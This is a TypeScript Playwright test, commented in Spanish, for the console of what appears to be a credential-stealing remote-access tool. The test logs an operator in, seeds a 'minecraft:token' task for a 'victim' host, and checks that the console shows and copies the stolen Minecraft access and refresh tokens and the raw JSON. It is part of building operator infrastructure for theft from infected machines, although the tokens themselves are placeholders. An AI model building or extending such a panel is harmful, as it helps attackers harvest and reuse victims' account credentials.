// Verificación token de Minecraft: tarjeta, skin, copia y JSON plegable.
// Uso: npx tsx tests/verify-minecraft.ts
import { chromium } from 'playwright-core';
import { authenticator } from 'otplib';
import { PrismaClient } from '@prisma/client';

const prisma = new PrismaClient();
const UI = 'http://127.0.0.1:3000';

async function main() {
  const admin = await prisma.operator.findUniqueOrThrow({ where: { email: 'admin@spc.local' } });
  const victim = await prisma.victim.findFirstOrThrow({ where: { hostname: 'SEED-DESKTOP' } });
  const login = await fetch('http://127.0.0.1:4000/api/console/auth/login', {
    method: 'POST', headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ email: 'admin@spc.local', password: 'screenshot-pass', totp: authenticator.generate(admin.totpSecret) })
  });
  if (!login.ok) throw new Error(await login.text());
  const cookie = login.headers.get('set-cookie')!.split(';')[0]!;

  const task = await prisma.task.create({
    data: {
      victimId: victim.id, name: 'minecraft:token', status: 'done', params: {},
      result: {
        accounts: [{
          username: 'Notch', uuid: '069a79f444e94726a5befca90e38aaf5',
          accessToken: 'eyJhbGciOiJIUzI1NiJ9.access.ACCESS_TOKEN_FULL',
          refreshToken: 'M.R3_BAY.REFRESH_TOKEN_FULL', expiresAt: new Date(Date.now() + 86_400_000).toISOString(),
          state: 'valido', type: 'msa', raw: { accessToken: 'eyJhbGciOiJIUzI1NiJ9.access.ACCESS_TOKEN_FULL', username: 'Notch' }
        }],
        errors: [], files: ['launcher_accounts.json']
      } as never,
      finishedAt: new Date()
    }
  });

  const browser = await chromium.launch({ executablePath: '/usr/bin/chromium-browser', headless: true });
  const context = await browser.newContext({ viewport: { width: 1500, height: 950 }, permissions: ['clipboard-read', 'clipboard-write'] });
  const [name, value] = cookie.split('=');
  await context.addCookies([{ name, value, url: UI } as never]);
  const page = await context.newPage();
  await page.goto(`${UI}/victims?select=${victim.id}`, { waitUntil: 'networkidle' });
  await page.waitForTimeout(1200);

  const card = await page.locator('[data-minecraft-account]').count();
  const skin = await page.locator('img[alt="skin Notch"]').getAttribute('src');
  await page.getByRole('button', { name: 'token', exact: true }).click();
  const tokenCopied = await page.evaluate(() => navigator.clipboard.readText());
  await page.getByRole('button', { name: 'refresh', exact: true }).click();
  const refreshCopied = await page.evaluate(() => navigator.clipboard.readText());
  await page.locator('summary', { hasText: 'JSON crudo' }).click();
  const raw = await page.locator('pre', { hasText: 'ACCESS_TOKEN_FULL' }).count();
  await page.locator('[aria-label="Cuenta de Minecraft"]').scrollIntoViewIfNeeded();
  await page.screenshot({ path: '../docs/ui/after6-minecraft.png' });

  console.log(JSON.stringify({ card, skin, tokenCopied, refreshCopied, raw, stateBadge: await page.locator('text=valido').count() }, null, 2));

  await prisma.task.delete({ where: { id: task.id } });
  await browser.close();
  await prisma.$disconnect();
}

main().catch(async (error) => { console.error(error); await prisma.$disconnect(); process.exit(1); });
